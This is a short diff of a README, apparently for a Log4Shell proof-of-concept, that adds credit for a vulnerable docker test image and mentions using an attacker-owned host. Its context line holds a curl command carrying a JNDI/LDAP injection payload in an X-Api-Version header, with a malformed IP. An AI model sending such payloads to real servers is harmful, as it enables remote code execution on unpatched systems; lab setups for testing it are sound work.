@@ -17,8 +17,7 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://1270.0.0.1/o=refence}
 
 
 ### Example
-
-Spin up a test target
+Spin up a test target. In this example I use a vulnerable docker image provided by [@breadchris](https://github.com/breadchris)
 ![Imgur](https://i.imgur.com/Syt6SvE.png)
 
 Spin up or use an attacker owned host.  
